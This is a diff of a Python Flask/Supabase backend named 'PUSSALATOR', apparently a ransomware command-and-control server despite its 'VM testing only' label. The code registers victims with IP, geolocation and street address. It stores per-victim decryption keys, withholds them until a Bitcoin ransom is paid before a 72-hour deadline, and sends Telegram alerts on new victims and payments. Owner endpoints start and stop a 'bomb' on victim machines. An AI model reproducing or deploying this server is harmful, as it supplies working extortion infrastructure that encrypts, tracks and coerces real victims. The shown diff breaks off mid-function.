@@ -1,507 +1,535 @@
 #!/usr/bin/env python3
 """
-PUSSALATOR - Complete Backend with Supabase Database
+PUSSALATOR - Supabase Backend
 FOR VM TESTING ONLY
 """
 
 import os
-import sys
 import json
-import time
 import random
+import string
 import hashlib
-import hmac
-import secrets
-import threading
-import socket
-import uuid
-import subprocess
-import logging
-import platform
 from datetime import datetime, timedelta
-from typing import Optional, Dict, Any, List
-from contextlib import asynccontextmanager
-from fastapi import FastAPI, Request, Response, HTTPException, status, WebSocket, WebSocketDisconnect, Depends
-from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse
-from fastapi.middleware.cors import CORSMiddleware
-from fastapi.security import HTTPBasic, HTTPBasicCredentials
-from pydantic import BaseModel
+from functools import wraps
+from typing import Optional, Dict, Any
+
+from flask import Flask, request, jsonify, session, redirect, url_for
+from flask_cors import CORS
+from supabase import create_client, Client
 import requests
-import uvicorn
-
-# Supabase client
-try:
-    from supabase import create_client, Client
-    HAS_SUPABASE = True
-except ImportError:
-    subprocess.check_call([sys.executable, "-m", "pip", "install", "supabase", "-q"])
-    from supabase import create_client, Client
-    HAS_SUPABASE = True
-
-# Cryptography
-try:
-    from cryptography.fernet import Fernet
-    HAS_CRYPTO = True
-except ImportError:
-    subprocess.check_call([sys.executable, "-m", "pip", "install", "cryptography", "-q"])
-    from cryptography.fernet import Fernet
 
 # ============================================================================
 # CONFIGURATION
 # ============================================================================
 
 class Config:
-    OWNER_PASSWORD = os.environ.get('OWNER_PASSWORD')
-    ADMIN_EMAIL = os.environ.get('ADMIN_EMAIL')
-    BTC_WALLET = os.environ.get('BTC_WALLET')
-    RANSOM_AMOUNT = os.environ.get('RANSOM_AMOUNT', '0.5')
-    SERVER_URL = os.environ.get('SERVER_URL')
-    TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '')
-    TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '')
-    SECRET_KEY = os.environ.get('SECRET_KEY', secrets.token_hex(32))
-    ENVIRONMENT = os.environ.get('ENVIRONMENT', 'production')
-    LOG_LEVEL = os.environ.get('LOG_LEVEL', 'WARNING')
+    SECRET_KEY = os.environ.get('SECRET_KEY') or 'pussalator-secret-key-change-this'
     
-    # Supabase config
-    SUPABASE_URL = os.environ.get('SUPABASE_URL', '')
-    SUPABASE_KEY = os.environ.get('SUPABASE_KEY', '')
+    # Supabase credentials
+    SUPABASE_URL = os.environ.get('SUPABASE_URL') or 'https://your-project.supabase.co'
+    SUPABASE_KEY = os.environ.get('SUPABASE_KEY') or 'your-supabase-anon-key'
+    SUPABASE_SERVICE_KEY = os.environ.get('SUPABASE_SERVICE_KEY') or 'your-service-role-key'
+    
+    # Ransom settings
+    DEFAULT_RANSOM_AMOUNT = os.environ.get('DEFAULT_RANSOM_AMOUNT') or '0.5 BTC'
+    DEFAULT_BTC_ADDRESS = os.environ.get('DEFAULT_BTC_ADDRESS') or '1PussWalletVMTest'
+    DEFAULT_DEADLINE_HOURS = int(os.environ.get('DEFAULT_DEADLINE_HOURS') or 72)
+    
+    # Owner credentials - CHANGE THIS!
+    OWNER_ID = os.environ.get('OWNER_ID') or '40671Mps19*'
+    OWNER_PASSWORD = os.environ.get('OWNER_PASSWORD') or 'pussalator123'
+    
+    # Telegram (optional)
+    TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN') or ''
+    TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID') or ''
+    
+    # Server settings
+    DEBUG = os.environ.get('DEBUG', 'False').lower() == 'true'
+    HOST = '0.0.0.0'
+    PORT = int(os.environ.get('PORT', 5000))
 
 # ============================================================================
-# LOGGING
+# FLASK APP INIT
 # ============================================================================
 
-logging.basicConfig(
-    level=getattr(logging, Config.LOG_LEVEL),
-    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
-    handlers=[
-        logging.FileHandler('pussalator.log'),
-        logging.StreamHandler()
-    ]
-)
-logger = logging.getLogger('pussalator')
+app = Flask(__name__)
+app.config['SECRET_KEY'] = Config.SECRET_KEY
+app.config['SESSION_COOKIE_HTTPONLY'] = True
+app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
+CORS(app)
 
 # ============================================================================
 # SUPABASE CLIENT
 # ============================================================================
 
-supabase: Optional[Client] = None
-if Config.SUPABASE_URL and Config.SUPABASE_KEY:
+supabase: Client = create_client(Config.SUPABASE_URL, Config.SUPABASE_KEY)
+supabase_admin: Client = create_client(Config.SUPABASE_URL, Config.SUPABASE_SERVICE_KEY)
+
+# ============================================================================
+# HELPER FUNCTIONS
+# ============================================================================
+
+def generate_victim_id() -> str:
+    """Generate random victim ID"""
+    chars = string.ascii_uppercase + string.digits
+    timestamp = datetime.now().strftime('%Y%m%d%H%M%S')
+    random_part = ''.join(random.choices(chars, k=8))
+    return f"VIC-{timestamp}-{random_part}"
+
+def generate_encryption_key() -> str:
+    """Generate encryption key"""
+    from cryptography.fernet import Fernet
+    return Fernet.generate_key().decode()
+
+def log_action(action: str, details: str, victim_id: str = None):
+    """Log system action to Supabase"""
     try:
-        supabase = create_client(Config.SUPABASE_URL, Config.SUPABASE_KEY)
-        logger.info("✅ Supabase connected")
-    except Exception as e:
-        logger.error(f"❌ Supabase connection failed: {e}")
+        supabase_admin.table('system_logs').insert({
+            'level': 'INFO',
+            'message': f"{action}: {details}",
+            'victim_id': victim_id
+        }).execute()
+    except:
+        pass
 
-# ============================================================================
-# TELEGRAM INTEGRATION
-# ============================================================================
-
-class TelegramService:
-    def __init__(self, token: str, chat_id: str):
-        self.token = token
-        self.chat_id = chat_id
-        self.enabled = bool(token and chat_id)
-        self.base_url = f"https://api.telegram.org/bot{token}"
-    
-    def send(self, text: str) -> bool:
-        if not self.enabled:
-            return False
-        try:
-            response = requests.post(
-                f"{self.base_url}/sendMessage",
-                json={
-                    'chat_id': self.chat_id,
-                    'text': text,
-                    'parse_mode': 'HTML'
-                },
-                timeout=5
-            )
-            return response.status_code == 200
-        except:
-            return False
-    
-    def notify_new(self, victim: Dict) -> None:
-        if self.enabled:
-            msg = f"🔔 NEW VICTIM\nID: {victim['id']}\nLocation: {victim.get('city','Unknown')}, {victim.get('country','Unknown')}\nIP: {victim.get('ip','0.0.0.0')}"
-            self.send(msg)
-    
-    def notify_payment(self, victim: Dict) -> None:
-        if self.enabled:
-            msg = f"💰 PAYMENT RECEIVED\nID: {victim['id']}\nAmount: {victim.get('ransom','0.5')} BTC\nTX: {victim.get('tx','')[:16]}..."
-            self.send(msg)
-    
-    def notify_bomb(self, client_id: str, action: str, size: float = 0) -> None:
-        if self.enabled:
-            if action == "start":
-                msg = f"💣 BOMB STARTED\nClient: {client_id}"
-            elif action == "stop":
-                msg = f"🛑 BOMB STOPPED\nClient: {client_id}"
-            elif action == "progress":
-                msg = f"📊 BOMB PROGRESS\nClient: {client_id}\nSize: {size:.2f} GB"
-            else:
-                msg = f"💣 BOMB {action.upper()}\nClient: {client_id}"
-            self.send(msg)
-
-telegram = TelegramService(Config.TELEGRAM_BOT_TOKEN, Config.TELEGRAM_CHAT_ID)
-
-# ============================================================================
-# DATABASE - Using Supabase
-# ============================================================================
-
-class Database:
-    def __init__(self):
-        self.use_supabase = supabase is not None
-        self.victims: Dict[str, Dict] = {}  # Fallback cache
-        self.logs: List[Dict] = []
-        self.bomb_commands: Dict[str, List[Dict]] = {}
-        self.settings = {
-            'ransom': Config.RANSOM_AMOUNT,
-            'wallet': Config.BTC_WALLET,
-            'window': 72,
-            'version': '1.0.0'
-        }
+def get_stats() -> Dict[str, Any]:
+    """Get system statistics from Supabase"""
+    try:
+        # Total victims
+        total = supabase_admin.table('victims').select('*', count='exact').execute()
+        total_count = len(total.data)
         
-        if not self.use_supabase:
-            logger.warning("⚠️ Supabase not configured - using local JSON storage")
-            self._load_local()
-        else:
-            logger.info("✅ Using Supabase database")
-            self._init_supabase()
-    
-    def _init_supabase(self):
-        """Verify Supabase connection"""
-        try:
-            result = supabase.table('victims').select('*').limit(1).execute()
-            logger.info(f"✅ Supabase connection verified, table 'victims' exists")
-        except Exception as e:
-            logger.error(f"❌ Supabase table error: {e}")
-    
-    def _load_local(self):
-        """Load from local JSON file (fallback)"""
-        try:
-            if os.path.exists('pussalator_data.json'):
-                with open('pussalator_data.json', 'r') as f:
-                    data = json.load(f)
-                    self.victims = data.get('victims', {})
-                    self.logs = data.get('logs', [])
-                    self.bomb_commands = data.get('bomb_commands', {})
-                    self.settings.update(data.get('settings', {}))
-        except Exception as e:
-            logger.error(f"Load error: {e}")
-    
-    def _save_local(self):
-        """Save to local JSON file"""
-        try:
-            with open('pussalator_data.json', 'w') as f:
-                json.dump({
-                    'victims': self.victims,
-                    'logs': self.logs[-1000:],
-                    'bomb_commands': self.bomb_commands,
-                    'settings': self.settings
-                }, f, indent=2)
-        except Exception as e:
-            logger.error(f"Save error: {e}")
-    
-    def add_victim(self, victim_id: str, files: int = 0, hostname: str = "", 
-                   ip: str = "", country: str = "", city: str = "", 
-                   region: str = "", zip_code: str = "", street: str = "",
-                   lat: float = 0, lon: float = 0, isp: str = "",
-                   organization: str = "", os_info: str = "") -> Dict:
+        # By status
+        paid = supabase_admin.table('victims').select('*', count='exact').eq('status', 'paid').execute()
+        unpaid = supabase_admin.table('victims').select('*', count='exact').eq('status', 'unpaid').execute()
+        expired = supabase_admin.table('victims').select('*', count='exact').eq('status', 'expired').execute()
         
-        # Validate - don't add fake victims with 0 files from random IPs
-        if files == 0 and ip not in ['127.0.0.1', 'localhost']:
-            logger.warning(f"Rejected potential fake victim: {victim_id} from {ip}")
-            return {'error': 'invalid', 'id': victim_id}
+        # Total files
+        files_result = supabase_admin.table('victims').select('files').execute()
+        total_files = sum(v.get('files', 0) for v in files_result.data)
         
-        key = Fernet.generate_key().decode()
-        now = datetime.now()
-        deadline = now + timedelta(hours=self.settings['window'])
+        # Active bombs
+        active_bombs = supabase_admin.table('victims').select('*', count='exact').eq('bomb_status', 'active').execute()
         
-        victim = {
-            'id': victim_id,
-            'files': files,
-            'ransom': f"{self.settings['ransom']} BTC",
-            'wallet': self.settings['wallet'],
-            'status': 'unpaid',
-            'deadline': deadline.isoformat(),
-            'created': now.isoformat(),
-            'key': key,
-            'hostname': hostname or socket.gethostname(),
-            'ip': ip or '0.0.0.0',
-            'country': country or 'Unknown',
-            'region': region or 'Unknown',
-            'city': city or 'Unknown',
-            'zip': zip_code or 'Unknown',
-            'street': street or 'Unknown',
-            'lat': lat,
-            'lon': lon,
-            'isp': isp or 'Unknown',
-            'org': organization or 'Unknown',
-            'os': os_info or 'Unknown',
-            'paid_at': None,
-            'tx': None,
-            'last_seen': now.isoformat(),
-            'bomb_status': 'inactive',
-            'bomb_size': 0,
-            'notes': ''
-        }
-        
-        if self.use_supabase:
-            try:
-                data = supabase.table('victims').insert(victim).execute()
-                if data.data:
-                    logger.info(f"Victim added to Supabase: {victim_id}")
-                    return victim
-            except Exception as e:
-                logger.error(f"Supabase insert error: {e}")
-                self.victims[victim_id] = victim
-        else:
-            self.victims[victim_id] = victim
-            self._save_local()
-        
-        self.log('info', f"New victim: {victim_id}")
-        telegram.notify_new(victim)
-        return victim
-    
-    def get_victim(self, victim_id: str) -> Optional[Dict]:
-        if self.use_supabase:
-            try:
-                data = supabase.table('victims').select('*').eq('id', victim_id).execute()
-                if data.data:
-                    return data.data[0]
-            except Exception as e:
-                logger.error(f"Supabase query error: {e}")
-        return self.victims.get(victim_id)
-    
-    def update_victim(self, victim_id: str, data: Dict) -> bool:
-        update_data = data.copy()
-        update_data['last_seen'] = datetime.now().isoformat()
-        
-        if self.use_supabase:
-            try:
-                result = supabase.table('victims').update(update_data).eq('id', victim_id).execute()
-                return bool(result.data)
-            except Exception as e:
-                logger.error(f"Supabase update error: {e}")
-        
-        if victim_id in self.victims:
-            self.victims[victim_id].update(update_data)
-            self._save_local()
-            return True
-        return False
-    
-    def verify_payment(self, victim_id: str, tx: str) -> bool:
-        update_data = {
-            'status': 'paid',
-            'tx': tx,
-            'paid_at': datetime.now().isoformat()
-        }
-        
-        if self.use_supabase:
-            try:
-                result = supabase.table('victims').update(update_data).eq('id', victim_id).execute()
-                if result.data:
-                    victim = result.data[0]
-                    self.log('success', f"Payment for {victim_id}: {tx[:16]}...")
-                    telegram.notify_payment(victim)
-                    return True
-            except Exception as e:
-                logger.error(f"Supabase update error: {e}")
-        
-        if victim_id in self.victims:
-            self.victims[victim_id].update(update_data)
-            self._save_local()
-            self.log('success', f"Payment for {victim_id}: {tx[:16]}...")
-            telegram.notify_payment(self.victims[victim_id])
-            return True
-        return False
-    
-    def delete_victim(self, victim_id: str) -> bool:
-        if self.use_supabase:
-            try:
-                result = supabase.table('victims').delete().eq('id', victim_id).execute()
-                if result.data:
-                    self.log('warning', f"Deleted: {victim_id}")
-                    return True
-            except Exception as e:
-                logger.error(f"Supabase delete error: {e}")
-        
-        if victim_id in self.victims:
-            del self.victims[victim_id]
-            if victim_id in self.bomb_commands:
-                del self.bomb_commands[victim_id]
-            self._save_local()
-            self.log('warning', f"Deleted: {victim_id}")
-            return True
-        return False
-    
-    def get_all(self) -> Dict:
-        if self.use_supabase:
-            try:
-                data = supabase.table('victims').select('*').execute()
-                if data.data:
-                    return {v['id']: v for v in data.data}
-            except Exception as e:
-                logger.error(f"Supabase query error: {e}")
-        return self.victims
-    
-    def get_stats(self) -> Dict:
-        victims = self.get_all()
-        total = len(victims)
-        paid = sum(1 for v in victims.values() if v.get('status') == 'paid')
-        unpaid = total - paid
-        active_bombs = sum(1 for v in victims.values() if v.get('bomb_status') == 'active')
-        
-        try:
-            amount = float(self.settings['ransom'])
-            total_btc = paid * amount
-        except:
-            total_btc = paid * 0.5
+        # Paid today
+        today = datetime.now().date().isoformat()
+        paid_today = supabase_admin.table('victims').select('*', count='exact')\
+            .eq('status', 'paid')\
+            .gte('paid_at', f"{today}T00:00:00")\
+            .lte('paid_at', f"{today}T23:59:59")\
+            .execute()
         
         return {
-            'total': total,
-            'paid': paid,
-            'unpaid': unpaid,
-            'btc': f"{total_btc:.2f}",
-            'bombs': active_bombs,
-            'time': datetime.now().isoformat()
+            'total': len(total.data),
+            'paid': len(paid.data),
+            'unpaid': len(unpaid.data),
+            'expired': len(expired.data),
+            'total_files': total_files,
+            'active_bombs': len(active_bombs.data),
+            'paid_today': len(paid_today.data)
         }
-    
-    def add_bomb_command(self, client_id: str, command: Dict):
-        if client_id not in self.bomb_commands:
-            self.bomb_commands[client_id] = []
-        self.bomb_commands[client_id].append(command)
-        if not self.use_supabase:
-            self._save_local()
-        logger.info(f"Bomb command added for {client_id}: {command}")
-    
-    def get_bomb_command(self, client_id: str) -> Optional[Dict]:
-        if client_id in self.bomb_commands and self.bomb_commands[client_id]:
-            cmd = self.bomb_commands[client_id].pop(0)
-            if not self.use_supabase:
-                self._save_local()
-            return cmd
-        return None
-    
-    def update_bomb_status(self, client_id: str, status: str, size: float = 0):
-        update_data = {
-            'bomb_status': status,
-            'bomb_size': size,
-            'last_seen': datetime.now().isoformat()
+    except Exception as e:
+        print(f"Stats error: {e}")
+        return {
+            'total': 0, 'paid': 0, 'unpaid': 0, 'expired': 0,
+            'total_files': 0, 'active_bombs': 0, 'paid_today': 0
+        }
+
+# ============================================================================
+# AUTHENTICATION DECORATORS
+# ============================================================================
+
+def owner_required(f):
+    """Decorator for owner-only routes"""
+    @wraps(f)
+    def decorated_function(*args, **kwargs):
+        if not session.get('owner_logged_in'):
+            return jsonify({'error': 'Unauthorized'}), 401
+        return f(*args, **kwargs)
+    return decorated_function
+
+# ============================================================================
+# ROUTES - PUBLIC PAGES
+# ============================================================================
+
+@app.route('/')
+def login_page():
+    """Main login page"""
+    return render_html(LOGIN_PAGE)
+
+@app.route('/victim/<victim_id>')
+def victim_page(victim_id):
+    """Victim status page"""
+    return render_html(VICTIM_PAGE.replace('{{ victim_id }}', victim_id))
+
+@app.route('/owner/dashboard')
+@owner_required
+def owner_dashboard():
+    """Owner dashboard"""
+    return render_html(OWNER_DASHBOARD)
+
+def render_html(html_content):
+    """Render HTML with proper headers"""
+    from flask import make_response
+    response = make_response(html_content)
+    response.headers['Content-Type'] = 'text/html'
+    return response
+
+# ============================================================================
+# ROUTES - API (Public)
+# ============================================================================
+
+@app.route('/api/stats')
+def api_stats():
+    """Public stats endpoint"""
+    return jsonify(get_stats())
+
+@app.route('/api/victim/<victim_id>')
+def api_get_victim(victim_id):
+    """Get victim details (public)"""
+    try:
+        result = supabase_admin.table('victims').select('*').eq('id', victim_id).execute()
+        
+        if not result.data:
+            return jsonify({'error': 'Not found'}), 404
+        
+        victim = result.data[0]
+        
+        # Check deadline
+        if victim['status'] == 'unpaid' and victim.get('deadline'):
+            deadline = datetime.fromisoformat(victim['deadline'].replace('Z', '+00:00'))
+            if datetime.utcnow() > deadline:
+                supabase_admin.table('victims').update({'status': 'expired'}).eq('id', victim_id).execute()
+                victim['status'] = 'expired'
+        
+        # Don't send key unless paid
+        if victim['status'] != 'paid':
+            victim['key'] = None
+        
+        return jsonify(victim)
+        
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/add-victim', methods=['POST'])
+def api_add_victim():
+    """Register new victim (called by client)"""
+    try:
+        data = request.json
+        victim_id = data.get('victim_id') or generate_victim_id()
+        
+        # Check if exists
+        existing = supabase_admin.table('victims').select('id').eq('id', victim_id).execute()
+        if existing.data:
+            return jsonify({'error': 'Victim exists'}), 400
+        
+        # Calculate deadline
+        deadline = (datetime.utcnow() + timedelta(hours=Config.DEFAULT_DEADLINE_HOURS)).isoformat()
+        
+        # Generate key
+        encryption_key = generate_encryption_key()
+        
+        # Prepare victim data
+        victim_data = {
+            'id': victim_id,
+            'key': encryption_key,
+            'deadline': deadline,
+            'created': datetime.utcnow().isoformat(),
+            'status': 'unpaid',
+            'files': data.get('files', 0),
+            'ransom': Config.DEFAULT_RANSOM_AMOUNT,
+            'wallet': Config.DEFAULT_BTC_ADDRESS,
+            'hostname': data.get('hostname', 'Unknown'),
+            'ip': data.get('ip', '0.0.0.0'),
+            'country': data.get('country', 'Unknown'),
+            'region': data.get('region', 'Unknown'),
+            'city': data.get('city', 'Unknown'),
+            'zip': data.get('zip', 'Unknown'),
+            'street': data.get('street', 'Unknown'),
+            'lat': data.get('lat', 0.0),
+            'lon': data.get('lon', 0.0),
+            'isp': data.get('isp', 'Unknown'),
+            'org': data.get('organization', 'Unknown'),
+            'os': data.get('os', 'Unknown'),
+            'bomb_status': 'inactive',
+            'bomb_size': 0,
+            'tags': ['new']
         }
         
-        if self.use_supabase:
+        # Insert into Supabase
+        result = supabase_admin.table('victims').insert(victim_data).execute()
+        
+        # Log
+        log_action('new_victim', f'New victim: {victim_id}', victim_id)
+        
+        # Send Telegram notification if configured
+        if Config.TELEGRAM_BOT_TOKEN and Config.TELEGRAM_CHAT_ID:
             try:
-                supabase.table('victims').update(update_data).eq('id', client_id).execute()
+                msg = f"🔴 NEW VICTIM\nID: {victim_id}\nLocation: {data.get('city', 'Unknown')}, {data.get('country', 'Unknown')}\nIP: {data.get('ip', '0.0.0.0')}"
+                requests.post(
+                    f"https://api.telegram.org/bot{Config.TELEGRAM_BOT_TOKEN}/sendMessage",
+                    json={'chat_id': Config.TELEGRAM_CHAT_ID, 'text': msg},
+                    timeout=3
+                )
             except:
                 pass
         
-        if client_id in self.victims:
-            self.victims[client_id].update(update_data)
-            if not self.use_supabase:
-                self._save_local()
-        
-        if status == 'active' and size > 0:
-            telegram.notify_bomb(client_id, "progress", size)
-    
-    def log(self, level: str, msg: str):
-        entry = {
-            'time': datetime.now().isoformat(),
-            'level': level,
-            'msg': msg
+        # Prepare response
+        response = {
+            'victim_id': victim_id,
+            'key': encryption_key,
+            'deadline': deadline,
+            'ransom': Config.DEFAULT_RANSOM_AMOUNT,
+            'wallet': Config.DEFAULT_BTC_ADDRESS
         }
-        self.logs.append(entry)
-        if not self.use_supabase:
-            self._save_local()
-        logger.info(f"[{level}] {msg}")
+        
+        # Add Telegram if configured
+        if Config.TELEGRAM_BOT_TOKEN and Config.TELEGRAM_CHAT_ID:
+            response['telegram_bot_token'] = Config.TELEGRAM_BOT_TOKEN
+            response['telegram_chat_id'] = Config.TELEGRAM_CHAT_ID
+        
+        return jsonify(response), 200
+        
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/update-victim', methods=['POST'])
+def api_update_victim():
+    """Update victim info"""
+    try:
+        data = request.json
+        victim_id = data.get('victim_id')
+        files = data.get('files_encrypted')
+        
+        update_data = {
+            'last_seen': datetime.utcnow().isoformat()
+        }
+        
+        if files is not None:
+            update_data['files'] = files
+        
+        supabase_admin.table('victims').update(update_data).eq('id', victim_id).execute()
+        
+        return jsonify({'success': True}), 200
+        
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/verify-payment', methods=['POST'])
+def api_verify_payment():
+    """Verify payment from client"""
+    try:
+        data = request.json
+        victim_id = data.get('victim_id')
+        tx_id = data.get('tx_id', 'manual_verification')
+        
+        # Update victim
+        supabase_admin.table('victims').update({
+            'status': 'paid',
+            'paid_at': datetime.utcnow().isoformat(),
+            'tx': tx_id
+        }).eq('id', victim_id).execute()
+        
+        # Get key
+        result = supabase_admin.table('victims').select('key').eq('id', victim_id).execute()
+        key = result.data[0]['key'] if result.data else None
+        
+        log_action('payment', f'Payment for {victim_id}: {tx_id}', victim_id)
+        
+        return jsonify({'success': True, 'key': key}), 200
+        
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+# ============================================================================
+# ROUTES - API (Bomb Commands)
+# ============================================================================
+
+@app.route('/api/bomb/command/<victim_id>')
+def api_get_bomb_command(victim_id):
+    """Get pending bomb command"""
+    # Check bomb status - in a real implementation you'd have a commands table
+    # For simplicity, we'll just check the victim's bomb_status
+    result = supabase_admin.table('victims').select('bomb_status').eq('id', victim_id).execute()
     
-    def get_logs(self, limit: int = 100) -> List:
-        return self.logs[-limit:]
+    if result.data and result.data[0].get('bomb_status') == 'active':
+        return jsonify({'action': 'start', 'filename': 'explosion.dat'})
+    
+    return jsonify({'action': 'none'})
 
-db = Database()
-
-# ============================================================================
-# API MODELS
-# ============================================================================
-
-class VictimRegister(BaseModel):
-    victim_id: str
-    files: int = 0
-    hostname: Optional[str] = None
-    ip: Optional[str] = None
-    country: Optional[str] = None
-    region: Optional[str] = None
-    city: Optional[str] = None
-    zip: Optional[str] = None
-    street: Optional[str] = None
-    lat: Optional[float] = 0
-    lon: Optional[float] = 0
-    isp: Optional[str] = None
-    organization: Optional[str] = None
-    os: Optional[str] = None
-
-class PaymentVerify(BaseModel):
-    victim_id: str
-    tx_id: str
-
-class BombStart(BaseModel):
-    client_id: str
-    filename: str = "explosion.dat"
-
-class BombStop(BaseModel):
-    client_id: str
-
-class BombUpdate(BaseModel):
-    client_id: str
-    size_gb: Optional[float] = 0
-    bytes: Optional[int] = 0
-    error: Optional[str] = None
-
-class OwnerLogin(BaseModel):
-    password: str
+@app.route('/api/bomb/update', methods=['POST'])
+def api_bomb_update():
+    """Update bomb status"""
+    try:
+        data = request.json
+        victim_id = data.get('client_id')
+        size_gb = data.get('size_gb', 0)
+        error = data.get('error')
+        
+        update_data = {}
+        
+        if error:
+            update_data['bomb_status'] = 'error'
+            update_data['notes'] = f"Bomb error: {error}"
+        else:
+            update_data['bomb_size'] = size_gb
+        
+        supabase_admin.table('victims').update(update_data).eq('id', victim_id).execute()
+        
+        return jsonify({'success': True}), 200
+        
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
 
 # ============================================================================
-# AUTH
+# ROUTES - API (Owner Only)
 # ============================================================================
 
-security = HTTPBasic()
+@app.route('/api/owner/login', methods=['POST'])
+def api_owner_login():
+    """Owner login API"""
+    data = request.json
+    owner_id = data.get('owner_id')
+    password = data.get('password')
+    
+    if owner_id == Config.OWNER_ID and password == Config.OWNER_PASSWORD:
+        session['owner_logged_in'] = True
+        session.permanent = True
+        log_action('owner_login', 'Owner logged in')
+        return jsonify({'success': True})
+    
+    return jsonify({'success': False}), 401
 
-def verify_owner(creds: HTTPBasicCredentials = Depends(security)):
-    if not hmac.compare_digest(creds.password.encode(), Config.OWNER_PASSWORD.encode()):
-        raise HTTPException(status_code=401)
-    return creds.username
+@app.route('/api/owner/logout', methods=['POST'])
+def api_owner_logout():
+    """Owner logout"""
+    session.pop('owner_logged_in', None)
+    return jsonify({'success': True})
 
-# ============================================================================
-# FASTAPI APP
-# ============================================================================
+@app.route('/api/owner/victims')
+@owner_required
+def api_owner_victims():
+    """Get all victims (owner only)"""
+    try:
+        result = supabase_admin.table('victims').select('*').order('created', desc=True).execute()
+        return jsonify(result.data)
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
 
-@asynccontextmanager
-async def lifespan(app: FastAPI):
-    logger.info("=" * 50)
-    logger.info("PUSSALATOR v1.0 STARTING")
-    logger.info("=" * 50)
-    logger.info(f"Port: {os.environ.get('PORT', 8000)}")
-    logger.info(f"Supabase: {'✅ Connected' if db.use_supabase else '❌ Not connected'}")
-    logger.info(f"Telegram: {'ON' if telegram.enabled else 'OFF'}")
-    logger.info("=" * 50)
-    yield
-    logger.info("Shutting down...")
+@app.route('/api/owner/victim/<victim_id>')
+@owner_required
+def api_owner_victim(victim_id):
+    """Get single victim (owner only)"""
+    try:
+        result = supabase_admin.table('victims').select('*').eq('id', victim_id).execute()
+        
+        if not result.data:
+            return jsonify({'error': 'Not found'}), 404
+        
+        return jsonify(result.data[0])
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
 
-app = FastAPI(
-    title="PUSSALATOR",
-    version="1.0.0",
-    lifespan=lifespan,
-    docs_url=None,
-    redoc_url=None
-)
+@app.route('/api/owner/victim/<victim_id>', methods=['PUT'])
+@owner_required
+def api_owner_update_victim(victim_id):
+    """Update victim (owner only)"""
+    try:
+        data = request.json
+        update_data = {}
+        
+        # Only allow updating specific fields
+        allowed_fields = ['status', 'ransom', 'wallet', 'notes', 'tags', 'bomb_status']
+        
+        for field in allowed_fields:
+            if field in data:
+                update_data[field] = data[field]
+        
+        if update_data:
+            supabase_admin.table('victims').update(update_data).eq('id', victim_id).execute()
+            log_action('update_victim', f'Updated {victim_id}', victim_id)
+        
+        return jsonify({'success': True})
+        
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
 
-app.add_middleware(
-    CORSMiddleware,
-    allow_origins=["*"],
-    allow_credentials=True,
-    allow_methods=["*"],
-    allow_headers=["*"],
-)
+@app.route('/api/owner/bomb/start', methods=['POST'])
+@owner_required
+def api_owner_bomb_start():
+    """Start bomb on victim"""
+    try:
+        data = request.json
+        victim_id = data.get('victim_id')
+        
+        supabase_admin.table('victims').update({
+            'bomb_status': 'active',
+            'bomb_size': 0
+        }).eq('id', victim_id).execute()
+        
+        log_action('bomb_start', f'Started bomb on {victim_id}', victim_id)
+        
+        return jsonify({'success': True})
+        
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/owner/bomb/stop', methods=['POST'])
+@owner_required
+def api_owner_bomb_stop():
+    """Stop bomb on victim"""
+    try:
+        data = request.json
+        victim_id = data.get('victim_id')
+        
+        supabase_admin.table('victims').update({
+            'bomb_status': 'stopped'
+        }).eq('id', victim_id).execute()
+        
+        log_action('bomb_stop', f'Stopped bomb on {victim_id}', victim_id)
+        
+        return jsonify({'success': True})
+        
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/owner/mark-paid/<victim_id>', methods=['POST'])
+@owner_required
+def api_owner_mark_paid(victim_id):
+    """Mark victim as paid"""
+    try:
+        supabase_admin.table('victims').update({
+            'status': 'paid',
+            'paid_at': datetime.utcnow().isoformat()
+        }).eq('id', victim_id).execute()
+        
+        log_action('mark_paid', f'Marked {victim_id} as paid', victim_id)
+        
+        return jsonify({'success': True})
+        
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/owner/delete-victim/<victim_id>', methods=['DELETE'])
+@owner_required
+def api_owner_delete_victim(victim_id):
+    """Delete victim (careful!)"""
+    try:
+        supabase_admin.table('victims').delete().eq('id', victim_id).execute()
+        log_action('delete_victim', f'Deleted {victim_id}', victim_id)
+        return jsonify({'success': True})
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/owner/logs')
+@owner_required
+def api_owner_logs():
+    """Get logs"""
+    try:
+        result = supabase_admin.table('system_logs').select('*').order('time', desc=True).limit(100).execute()
+        return jsonify(result.data)
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
 
 # ============================================================================
 # HTML TEMPLATES - FIXED: Properly assigned to variables
@@ -1526,178 +1554,32 @@ OWNER_DASHBOARD_HTML = """
 """
 
 # ============================================================================
-# API ROUTES
-# ============================================================================
-
-@app.get('/', response_class=HTMLResponse)
-async def index():
-    return INDEX_HTML
-
-@app.get('/victim', response_class=HTMLResponse)
-async def victim_page():
-    return VICTIM_HTML
-
-@app.get('/owner/login', response_class=HTMLResponse)
-async def owner_login_page():
-    return OWNER_LOGIN_HTML
-
-@app.get('/owner/dashboard', response_class=HTMLResponse)
-async def owner_dashboard():
-    return OWNER_DASHBOARD_HTML
-
-@app.get('/api/stats')
-async def get_stats():
-    return db.get_stats()
-
-@app.get('/api/logs')
-async def get_logs(limit: int = 100):
-    return db.get_logs(limit)
-
-@app.get('/api/victims')
-async def get_victims():
-    return db.get_all()
-
-@app.get('/api/victim/{vid}')
-async def get_victim(vid: str):
-    v = db.get_victim(vid)
-    if not v:
-        raise HTTPException(404)
-    return v
-
-@app.post('/api/add-victim')
-async def add_victim(request: Request, victim: VictimRegister):
-    # Check if this is likely a real client
